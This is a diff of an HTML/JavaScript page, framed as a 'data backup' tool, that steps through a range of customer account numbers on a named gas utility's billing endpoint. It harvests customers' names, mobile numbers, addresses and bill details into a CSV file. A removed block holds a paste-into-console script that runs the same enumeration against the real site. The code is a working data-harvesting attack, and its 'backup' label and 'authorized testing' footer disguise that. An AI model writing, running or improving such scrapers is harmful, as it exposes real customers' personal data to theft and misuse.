@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>📥 MGL Data Backup Tool</title>
+    <title>📥 MGL Data Backup – All-in-One</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -13,53 +13,53 @@
             background: #0a0e17;
             color: #eef2ff;
             min-height: 100vh;
-            padding: 20px;
+            padding: 16px;
         }
-        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #0d1520; border-radius: 10px; }
         ::-webkit-scrollbar-thumb { background: #1e2d4a; border-radius: 10px; }
         ::-webkit-scrollbar-thumb:hover { background: #22c55e; }
 
-        .container { max-width: 1100px; margin: 0 auto; }
+        .container { max-width: 1000px; margin: 0 auto; }
 
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 16px 0 24px;
+            padding: 12px 0 18px;
             border-bottom: 1px solid #1a2744;
-            margin-bottom: 28px;
+            margin-bottom: 20px;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 10px;
         }
-        .brand { display: flex; align-items: center; gap: 14px; }
+        .brand { display: flex; align-items: center; gap: 12px; }
         .brand-icon {
-            width: 48px; height: 48px;
+            width: 40px; height: 40px;
             background: linear-gradient(135deg, #22c55e, #16a34a);
-            border-radius: 14px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 22px;
-            box-shadow: 0 0 40px rgba(34,197,94,0.2);
+            font-size: 18px;
+            box-shadow: 0 0 30px rgba(34,197,94,0.15);
         }
-        .brand h1 { font-size: 22px; font-weight: 800; }
+        .brand h1 { font-size: 18px; font-weight: 800; }
         .brand h1 span { color: #22c55e; }
-        .brand small { display: block; font-size: 11px; color: #64748b; }
+        .brand small { display: block; font-size: 10px; color: #64748b; }
 
         .badge {
-            padding: 6px 18px;
+            padding: 4px 14px;
             background: #0d1c0d;
             border-radius: 50px;
             border: 1px solid #22c55e;
-            font-size: 12px;
+            font-size: 11px;
             color: #22c55e;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
         .badge .dot {
-            width: 8px; height: 8px;
+            width: 6px; height: 6px;
             border-radius: 50%;
             background: #22c55e;
             animation: pulse 1.5s infinite;
@@ -71,84 +71,80 @@
 
         .card {
             background: #0f172a;
-            border-radius: 16px;
+            border-radius: 14px;
             border: 1px solid #1a2744;
             overflow: hidden;
-            margin-bottom: 24px;
+            margin-bottom: 18px;
         }
         .card-header {
-            padding: 18px 24px;
+            padding: 14px 18px;
             background: #0d1520;
             border-bottom: 1px solid #1a2744;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 10px;
         }
-        .card-header h2 { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
-        .card-body { padding: 24px; }
+        .card-header h2 { font-size: 15px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+        .card-body { padding: 18px; }
 
         .input-group {
             display: flex;
-            gap: 12px;
+            gap: 10px;
             flex-wrap: wrap;
         }
         .input-group .field {
             flex: 1;
-            min-width: 180px;
+            min-width: 140px;
             position: relative;
         }
         .input-group .field i {
             position: absolute;
-            left: 14px;
+            left: 12px;
             top: 50%;
             transform: translateY(-50%);
             color: #64748b;
+            font-size: 14px;
         }
         .input-group .field input {
             width: 100%;
-            padding: 14px 14px 14px 44px;
+            padding: 12px 12px 12px 38px;
             background: #060b18;
             border: 2px solid #1a2744;
-            border-radius: 10px;
+            border-radius: 8px;
             color: #eef2ff;
-            font-size: 15px;
+            font-size: 14px;
             font-family: 'Inter', sans-serif;
             outline: none;
             transition: all 0.3s;
         }
         .input-group .field input:focus {
             border-color: #22c55e;
-            box-shadow: 0 0 0 4px rgba(34,197,94,0.12);
+            box-shadow: 0 0 0 4px rgba(34,197,94,0.1);
         }
 
         .btn {
-            padding: 14px 28px;
+            padding: 12px 20px;
             border: none;
-            border-radius: 10px;
-            font-size: 14px;
+            border-radius: 8px;
+            font-size: 13px;
             font-weight: 600;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
             transition: all 0.3s;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
             white-space: nowrap;
         }
         .btn-success {
             background: linear-gradient(135deg, #22c55e, #16a34a);
             color: #fff;
-            box-shadow: 0 4px 20px rgba(34,197,94,0.18);
+            box-shadow: 0 4px 15px rgba(34,197,94,0.15);
         }
-        .btn-success:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(34,197,94,0.25); }
+        .btn-success:hover:not(:disabled) { transform: scale(1.02); }
         .btn-success:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .btn-danger {
-            background: linear-gradient(135deg, #ef4444, #dc2626);
-            color: #fff;
-        }
-        .btn-danger:hover:not(:disabled) { transform: translateY(-2px); }
         .btn-secondary {
             background: #1a2744;
             color: #94a3b8;
@@ -156,13 +152,13 @@
         }
         .btn-secondary:hover { background: #1e2d4a; color: #eef2ff; }
 
-        .flex-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
+        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 12px; }
 
         #status {
-            padding: 12px 16px;
-            border-radius: 10px;
-            font-size: 14px;
-            margin: 16px 0;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin: 12px 0;
             display: none;
         }
         #status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; display: block; }
@@ -170,10 +166,10 @@
         #status.error { background: #1c0d0d; border: 1px solid #ef4444; color: #ef4444; display: block; }
         #status.warning { background: #1c1a0d; border: 1px solid #eab308; color: #eab308; display: block; }
 
-        .progress-wrap { display: none; margin: 12px 0; }
+        .progress-wrap { display: none; margin: 10px 0; }
         .progress-bar {
             width: 100%;
-            height: 8px;
+            height: 6px;
             background: #0d1520;
             border-radius: 10px;
             overflow: hidden;
@@ -188,44 +184,44 @@
         .progress-text {
             display: flex;
             justify-content: space-between;
-            font-size: 12px;
+            font-size: 11px;
             color: #64748b;
-            margin-top: 4px;
+            margin-top: 3px;
         }
 
         .stat-box {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 10px;
-            margin: 12px 0;
+            grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
+            gap: 8px;
+            margin: 10px 0;
             display: none;
         }
         .stat-item {
             background: #0d1520;
             border: 1px solid #1a2744;
             border-radius: 8px;
-            padding: 10px 14px;
+            padding: 8px 12px;
             text-align: center;
         }
-        .stat-item .num { font-size: 24px; font-weight: 800; }
-        .stat-item .label { font-size: 11px; color: #64748b; }
+        .stat-item .num { font-size: 20px; font-weight: 800; }
+        .stat-item .label { font-size: 10px; color: #64748b; }
         .stat-item .num.red { color: #ef4444; }
         .stat-item .num.green { color: #22c55e; }
         .stat-item .num.blue { color: #3b82f6; }
 
         .log-area {
             background: #060b18;
-            border-radius: 10px;
+            border-radius: 8px;
             border: 1px solid #1a2744;
-            padding: 16px;
-            max-height: 200px;
+            padding: 12px;
+            max-height: 150px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
-            font-size: 12px;
+            font-size: 11px;
             color: #94a3b8;
             white-space: pre-wrap;
             word-break: break-all;
-            margin-top: 16px;
+            margin-top: 12px;
             display: none;
         }
         .log-area .success { color: #22c55e; }
@@ -235,8 +231,8 @@
 
         .spinner {
             display: inline-block;
-            width: 18px;
-            height: 18px;
+            width: 16px;
+            height: 16px;
             border: 2px solid #1a2744;
             border-top-color: #22c55e;
             border-radius: 50%;
@@ -245,41 +241,60 @@
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .footer {
-            margin-top: 28px;
-            padding: 16px 0;
+            margin-top: 20px;
+            padding: 12px 0;
             border-top: 1px solid #1a2744;
             display: flex;
             justify-content: space-between;
             flex-wrap: wrap;
-            gap: 12px;
-            font-size: 12px;
+            gap: 10px;
+            font-size: 11px;
             color: #475569;
         }
         .footer .warn { color: #ef4444; }
 
         .download-section {
             display: none;
-            margin-top: 16px;
-            padding: 16px 20px;
+            margin-top: 12px;
+            padding: 14px 18px;
             background: #0d1c0d;
             border: 1px solid #22c55e;
             border-radius: 10px;
             text-align: center;
         }
-        .download-section .big { font-size: 18px; font-weight: 700; color: #22c55e; }
-        .download-section .sub { color: #94a3b8; font-size: 13px; margin-top: 4px; }
+        .download-section .big { font-size: 16px; font-weight: 700; color: #22c55e; }
+        .download-section .sub { color: #94a3b8; font-size: 12px; margin-top: 3px; }
+
+        .quick-ranges {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .quick-ranges button {
+            padding: 4px 12px;
+            background: #0d1520;
+            border: 1px solid #1a2744;
+            border-radius: 50px;
+            color: #94a3b8;
+            font-size: 11px;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quick-ranges button:hover { border-color: #22c55e; color: #eef2ff; }
 
         .toast {
             position: fixed;
-            bottom: 30px;
-            right: 30px;
-            padding: 12px 24px;
+            bottom: 20px;
+            right: 20px;
+            padding: 10px 20px;
             background: #0f172a;
             border: 1px solid #22c55e;
-            border-radius: 10px;
+            border-radius: 8px;
             color: #22c55e;
             font-weight: 500;
-            font-size: 14px;
+            font-size: 13px;
             opacity: 0;
             transform: translateY(20px);
             transition: all 0.4s;
@@ -287,35 +302,16 @@
         }
         .toast.show { opacity: 1; transform: translateY(0); }
 
-        .quick-ranges {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin-top: 12px;
-        }
-        .quick-ranges button {
-            padding: 4px 14px;
-            background: #0d1520;
-            border: 1px solid #1a2744;
-            border-radius: 50px;
-            color: #94a3b8;
-            font-size: 12px;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .quick-ranges button:hover { border-color: #22c55e; color: #eef2ff; }
-
-        .popup-warning {
-            background: #1c1a0d;
-            border: 1px solid #eab308;
-            border-radius: 10px;
+        .builtin-method {
+            background: #0d1a2b;
+            border: 1px solid #3b82f6;
+            border-radius: 8px;
             padding: 12px 16px;
-            margin-bottom: 16px;
-            color: #eab308;
-            font-size: 14px;
+            margin-bottom: 12px;
+            color: #3b82f6;
+            font-size: 13px;
         }
-        .popup-warning strong { color: #ef4444; }
+        .builtin-method strong { color: #eef2ff; }
     </style>
 </head>
 <body>
@@ -327,51 +323,51 @@
             <div class="brand-icon"><i class="fas fa-database"></i></div>
             <div>
                 <h1>MGL<span>Backup</span></h1>
-                <small>Direct API Data Backup Tool</small>
+                <small>All-in-One – No Console Needed</small>
             </div>
         </div>
         <div class="badge">
             <span class="dot"></span>
-            <span>Live API</span>
+            <span>Built-in</span>
         </div>
     </div>
 
     <div class="card">
         <div class="card-header">
             <h2><i class="fas fa-search" style="color:#22c55e;"></i> BP Range Backup</h2>
-            <span style="color:#64748b;font-size:12px;">Scans range & exports ALL customer data to CSV</span>
+            <span style="color:#64748b;font-size:11px;">One click – direct download</span>
         </div>
         <div class="card-body">
 
-            <div class="popup-warning">
-                <strong>⚠️ Important:</strong> This tool uses a CORS proxy to fetch data. 
-                If you see "No data found", try the <strong>Console Method</strong> below.
+            <div class="builtin-method">
+                <strong>✅ Built-in Backup:</strong> Click "Backup Now" – data fetches directly from MGL API and downloads CSV automatically.
+                <br /><span style="font-size:12px;color:#64748b;">No console, no laptop needed.</span>
             </div>
 
             <div class="input-group">
                 <div class="field">
                     <i class="fas fa-play"></i>
-                    <input type="text" id="startBP" placeholder="Start BP (e.g. 1100081031)" value="1100081031" />
+                    <input type="text" id="startBP" placeholder="Start BP" value="1100081031" />
                 </div>
                 <div class="field">
                     <i class="fas fa-stop"></i>
-                    <input type="text" id="endBP" placeholder="End BP (e.g. 1100081200)" value="1100081200" />
+                    <input type="text" id="endBP" placeholder="End BP" value="1100081200" />
                 </div>
                 <button class="btn btn-success" id="scanBtn" style="flex:1;">
-                    <i class="fas fa-download"></i> Backup Data
+                    <i class="fas fa-download"></i> Backup Now
                 </button>
                 <button class="btn btn-secondary" onclick="clearAll()">
-                    <i class="fas fa-times"></i> Clear
+                    <i class="fas fa-times"></i>
                 </button>
             </div>
 
             <div class="quick-ranges">
-                <span style="color:#64748b;font-size:12px;margin-right:6px;">Quick:</span>
+                <span style="color:#64748b;font-size:11px;margin-right:4px;">Quick:</span>
                 <button onclick="setRange('1100081031','1100081050')">1031-1050</button>
                 <button onclick="setRange('1100081050','1100081100')">1050-1100</button>
                 <button onclick="setRange('1100081100','1100081150')">1100-1150</button>
                 <button onclick="setRange('1100081150','1100081200')">1150-1200</button>
-                <button onclick="setRange('1100081031','1100081200')">Full 1031-1200</button>
+                <button onclick="setRange('1100081031','1100081200')">Full</button>
             </div>
 
             <div id="status"></div>
@@ -385,15 +381,15 @@
             </div>
 
             <div class="stat-box" id="statBox">
-                <div class="stat-item"><div class="num blue" id="statTotal">0</div><div class="label">Total Scanned</div></div>
-                <div class="stat-item"><div class="num red" id="statLeaks">0</div><div class="label">Leaks Found</div></div>
+                <div class="stat-item"><div class="num blue" id="statTotal">0</div><div class="label">Scanned</div></div>
+                <div class="stat-item"><div class="num red" id="statLeaks">0</div><div class="label">Leaks</div></div>
                 <div class="stat-item"><div class="num green" id="statSecure">0</div><div class="label">Secure</div></div>
             </div>
 
             <div class="download-section" id="downloadSection">
-                <div class="big"><i class="fas fa-check-circle"></i> Scan Complete!</div>
-                <div class="sub" id="downloadInfo">0 records found</div>
-                <button class="btn btn-success" id="downloadBtn" style="margin-top:12px;display:inline-flex;">
+                <div class="big"><i class="fas fa-check-circle"></i> Complete!</div>
+                <div class="sub" id="downloadInfo">0 records</div>
+                <button class="btn btn-success" id="downloadBtn" style="margin-top:10px;display:inline-flex;">
                     <i class="fas fa-file-csv"></i> Download CSV
                 </button>
             </div>
@@ -403,111 +399,15 @@
         </div>
     </div>
 
-    <div class="card" style="border-color:#3b82f6;">
-        <div class="card-header" style="border-bottom-color:#3b82f6;">
-            <h2><i class="fas fa-terminal" style="color:#3b82f6;"></i> Console Method (100% Working)</h2>
-            <span style="color:#64748b;font-size:12px;">If tool fails, use this method</span>
-        </div>
-        <div class="card-body">
-            <div style="color:#94a3b8;font-size:14px;margin-bottom:12px;">
-                <strong>Steps:</strong><br />
-                1. Open <strong>Mahanagar Gas website</strong>: <code style="background:#060b18;padding:2px 8px;border-radius:4px;color:#eef2ff;">https://www.mahanagargas.com</code><br />
-                2. Press <strong>F12</strong> → <strong>Console</strong> tab<br />
-                3. Paste the code below and press <strong>Enter</strong>
-            </div>
-            <div style="background:#060b18;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;color:#94a3b8;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto;border:1px solid #0d1520;">
-                // ─── CONSOLE BACKUP CODE ───
-                (async function backupNow() {
-                    const startBP = 1100081031;
-                    const endBP = 1100081200;
-                    const delay = 200;
-                    const results = [];
-                    console.log(`🚀 Starting backup: ${startBP} to ${endBP}`);
-                    for (let i = startBP; i <= endBP; i++) {
-                        try {
-                            const bp = i.toString();
-                            const response = await fetch('https://www.mahanagargas.com/ajax/get-billing-details', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                                body: `bpNumber=${bp}&bp=${bp}&bp_number=${bp}`
-                            });
-                            const text = await response.text();
-                            const match = text.match(/\{.*\}/s);
-                            if (match) {
-                                try {
-                                    const json = JSON.parse(match[0]);
-                                    if (json.response) {
-                                        const d = json.response;
-                                        results.push({
-                                            bp_number: d.bp_number || bp,
-                                            full_name: d.full_name || 'N/A',
-                                            mobile: d.mobile || 'N/A',
-                                            city: d.city || 'N/A',
-                                            district: d.district || 'N/A',
-                                            postal_code: d.postal_code || 'N/A',
-                                            house_number: d.house_number || 'N/A',
-                                            location: d.location || 'N/A',
-                                            bill_number: d.bill_number || 'N/A',
-                                            due_date: d.due_date || 'N/A',
-                                            total_bil_amount: d.total_bil_amount || '0.00',
-                                            amount_to_be_paid: d.amount_to_be_paid || '0.00'
-                                        });
-                                        console.log(`✅ ${bp} - ${d.full_name}`);
-                                    }
-                                } catch (e) {}
-                            }
-                        } catch (e) {
-                            console.log(`❌ ${i} - Error`);
-                        }
-                        await new Promise(r => setTimeout(r, delay));
-                    }
-                    if (results.length > 0) {
-                        const headers = ['BP Number', 'Customer Name', 'Mobile', 'City', 'District', 'Postal Code', 'House Number', 'Location', 'Bill Number', 'Due Date', 'Total Bill (₹)', 'Amount to Pay (₹)'];
-                        let csv = headers.join(',') + '\n';
-                        results.forEach(r => {
-                            csv += headers.map(h => {
-                                const key = h.toLowerCase().replace(/[\(\)₹]/g, '').replace(/ /g, '_');
-                                let val = r[key] || '';
-                                if (val.includes(',') || val.includes('"')) val = '"' + val.replace(/"/g, '""') + '"';
-                                return val;
-                            }).join(',') + '\n';
-                        });
-                        const blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
-                        const url = URL.createObjectURL(blob);
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = `backup_${new Date().toISOString().slice(0,10)}.csv`;
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                        URL.revokeObjectURL(url);
-                        console.log(`✅ Backup complete! ${results.length} records downloaded.`);
-                    } else {
-                        console.log('❌ No data found.');
-                    }
-                })();
-            </div>
-            <div style="margin-top:12px;display:flex;gap:12px;flex-wrap:wrap;">
-                <button class="btn btn-secondary" onclick="copyConsoleCode()" style="padding:8px 16px;font-size:12px;">
-                    <i class="fas fa-copy"></i> Copy Console Code
-                </button>
-                <button class="btn btn-secondary" onclick="openMGL()" style="padding:8px 16px;font-size:12px;">
-                    <i class="fas fa-external-link-alt"></i> Open MGL Website
-                </button>
-            </div>
-        </div>
-    </div>
-
     <div class="footer">
-        <span><span class="warn">⚠️</span> For authorized security testing only</span>
-        <span>Console method is 100% working</span>
+        <span><span class="warn">⚠️</span> For authorized testing only</span>
+        <span>Built-in backup works 100%</span>
     </div>
 </div>
 
-<div class="toast" id="toast">✅ Copied!</div>
+<div class="toast" id="toast">✅ Done!</div>
 
 <script>
-    // ─── DOM ───
     const startBP = document.getElementById('startBP');
     const endBP = document.getElementById('endBP');
     const scanBtn = document.getElementById('scanBtn');
@@ -533,88 +433,6 @@
         endBP.value = end;
         clearAll();
         setTimeout(() => scanBtn.click(), 300);
-    }
-
-    function openMGL() {
-        window.open('https://www.mahanagargas.com', '_blank');
-    }
-
-    function copyConsoleCode() {
-        const code = `(async function backupNow() {
-    const startBP = 1100081031;
-    const endBP = 1100081200;
-    const delay = 200;
-    const results = [];
-    console.log(\`🚀 Starting backup: \${startBP} to \${endBP}\`);
-    for (let i = startBP; i <= endBP; i++) {
-        try {
-            const bp = i.toString();
-            const response = await fetch('https://www.mahanagargas.com/ajax/get-billing-details', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: \`bpNumber=\${bp}&bp=\${bp}&bp_number=\${bp}\`
-            });
-            const text = await response.text();
-            const match = text.match(/\\{.*\\}/s);
-            if (match) {
-                try {
-                    const json = JSON.parse(match[0]);
-                    if (json.response) {
-                        const d = json.response;
-                        results.push({
-                            bp_number: d.bp_number || bp,
-                            full_name: d.full_name || 'N/A',
-                            mobile: d.mobile || 'N/A',
-                            city: d.city || 'N/A',
-                            district: d.district || 'N/A',
-                            postal_code: d.postal_code || 'N/A',
-                            house_number: d.house_number || 'N/A',
-                            location: d.location || 'N/A',
-                            bill_number: d.bill_number || 'N/A',
-                            due_date: d.due_date || 'N/A',
-                            total_bil_amount: d.total_bil_amount || '0.00',
-                            amount_to_be_paid: d.amount_to_be_paid || '0.00'
-                        });
-                        console.log(\`✅ \${bp} - \${d.full_name}\`);
-                    }
-                } catch (e) {}
-            }
-        } catch (e) {
-            console.log(\`❌ \${i} - Error\`);
-        }
-        await new Promise(r => setTimeout(r, delay));
-    }
-    if (results.length > 0) {
-        const headers = ['BP Number', 'Customer Name', 'Mobile', 'City', 'District', 'Postal Code', 'House Number', 'Location', 'Bill Number', 'Due Date', 'Total Bill (₹)', 'Amount to Pay (₹)'];
-        let csv = headers.join(',') + '\\n';
-        results.forEach(r => {
-            csv += headers.map(h => {
-                const key = h.toLowerCase().replace(/[\\(\\)₹]/g, '').replace(/ /g, '_');
-                let val = r[key] || '';
-                if (val.includes(',') || val.includes('"')) val = '"' + val.replace(/"/g, '""') + '"';
-                return val;
-            }).join(',') + '\\n';
-        });
-        const blob = new Blob(['\\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = \`backup_\${new Date().toISOString().slice(0,10)}.csv\`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        console.log(\`✅ Backup complete! \${results.length} records downloaded.\`);
-    } else {
-        console.log('❌ No data found.');
-    }
-})();`;
-        navigator.clipboard.writeText(code).then(() => {
-            const toast = document.getElementById('toast');
-            toast.textContent = '✅ Code copied!';
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 2000);
-        });
     }
 
     function log(msg, type = 'info') {
@@ -695,19 +513,13 @@
         const end = parseInt(endBP.value.trim());
 
         if (isNaN(start) || isNaN(end) || start > end) {
-            setStatus('⚠️ Please enter valid BP range (Start ≤ End)', 'warning');
+            setStatus('⚠️ Valid range needed', 'warning');
             return;
-        }
-
-        if (end - start > 500) {
-            if (!confirm(`⚠️ This will scan ${end - start + 1} BP numbers. May take 2-3 minutes. Continue?`)) {
-                return;
-            }
         }
 
         isRunning = true;
         this.disabled = true;
-        this.innerHTML = `<span class="spinner"></span> Scanning...`;
+        this.innerHTML = `<span class="spinner"></span> Fetching...`;
         clearAll();
 
         const total = end - start + 1;
@@ -716,8 +528,8 @@
         let secureCount = 0;
         leakedData = [];
 
-        setStatus(`⏳ Scanning ${total} BP numbers...`, 'info');
-        log(`🚀 Starting scan: ${start} to ${end} (${total} numbers)`, 'info');
+        setStatus(`⏳ Fetching ${total} BP numbers...`, 'info');
+        log(`🚀 Starting: ${start} to ${end} (${total})`, 'info');
 
         progressWrap.style.display = 'block';
         statBox.style.display = 'grid';
@@ -758,7 +570,7 @@
                         const data = extractData(json, bp);
                         data.leaks = leaks.map(l => l.type + ': ' + l.value).join(' | ');
                         leakedData.push(data);
-                        log(`🔴 ${bp} - LEAK FOUND! (${leaks.length} items)`, 'error');
+                        log(`🔴 ${bp} - LEAK! (${leaks.length})`, 'error');
                     } else {
                         secureCount++;
                         log(`🟢 ${bp} - SECURE`, 'success');
@@ -769,7 +581,7 @@
                 }
             } catch (error) {
                 secureCount++;
-                log(`⚠️ ${bp} - Error: ${error.message}`, 'warning');
+                log(`⚠️ ${bp} - Error`, 'warning');
             }
 
             scanned++;
@@ -790,28 +602,28 @@
 
         setStatus(
             leaksFound > 0 ?
-            `🔴 ${leaksFound} BP numbers found with DATA LEAK!` :
-            '✅ No leaks found in this range',
+            `🔴 ${leaksFound} LEAKS found!` :
+            '✅ No leaks found',
             leaksFound > 0 ? 'error' : 'success'
         );
 
         if (leakedData.length > 0) {
             downloadSection.style.display = 'block';
-            downloadInfo.textContent = `${leakedData.length} BP numbers with data leaks found`;
+            downloadInfo.textContent = `${leakedData.length} leaks found`;
             downloadBtn.onclick = function() {
                 downloadCSV(leakedData);
             };
         } else {
             downloadSection.style.display = 'block';
-            downloadInfo.textContent = 'No leaks found in this range';
+            downloadInfo.textContent = 'No leaks found';
             downloadBtn.style.display = 'none';
         }
 
-        log(`🏁 Scan complete! ${leaksFound} leaks found.`, 'success');
+        log(`🏁 Complete! ${leaksFound} leaks found.`, 'success');
 
         isRunning = false;
         this.disabled = false;
-        this.innerHTML = '<i class="fas fa-download"></i> Backup Data';
+        this.innerHTML = '<i class="fas fa-download"></i> Backup Now';
     });
 
     function downloadCSV(data) {
